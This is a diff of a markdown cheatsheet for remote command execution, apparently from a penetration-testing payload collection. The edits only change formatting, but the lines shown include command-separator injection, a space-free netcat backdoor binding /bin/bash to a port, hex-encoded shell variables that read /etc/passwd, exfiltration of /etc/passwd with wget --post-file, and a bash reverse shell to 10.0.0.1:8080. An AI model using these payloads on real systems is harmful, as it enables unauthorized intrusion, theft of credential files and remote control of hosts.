@@ -3,12 +3,10 @@ Remote Command Exec Cheatsheet
 File notes
 
 **source-disc-cmd-exec-traversal.fuzz.txt**
-
-usage
+usage<br>
 ```GET /path/*payload*relative/path/to/target/file/```
 
 **Executing Commands**
-
 Seperating Commands<br>
 ``` blah;blah2 ```
 
@@ -40,13 +38,12 @@ Example netcat backdoor without spaces:<br>
 ``` {chmod,+x,./nc} ```<br>
 ``` {./nc,-l,-p,6666,-e,/bin/bash} ```<br>
 
-<b>Shell Variables</b>
+<b>Shell Variables</b><br>
 ``` CMD=$'cat\x20/etc/passwd';$CMD ```
 
-<br>shell variable increment through file one line at a time</b>
+shell variable, increment through file one line at a time: <br>
 increment the first +1 to retreive the entire file, line by line<br>
 ``` SP=$'\x20';cat$SP/etc/passwd|tail$SP-n+1|head$SP-n+1 ```
-
 
 **Exfiltrating Files / Data**
 
@@ -66,11 +63,10 @@ WGET: <br>
 ``` 'wget --post-file /etc/passwd' ```
 
 **One-Liner Reverse Shells**
-
 On the listener <br>
 ``` $ nc -l -p 8080 -vvv' ```
 
-On the remote host...
+On the remote host...<br>
 Bash:<br>
 ``` $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 ```
 
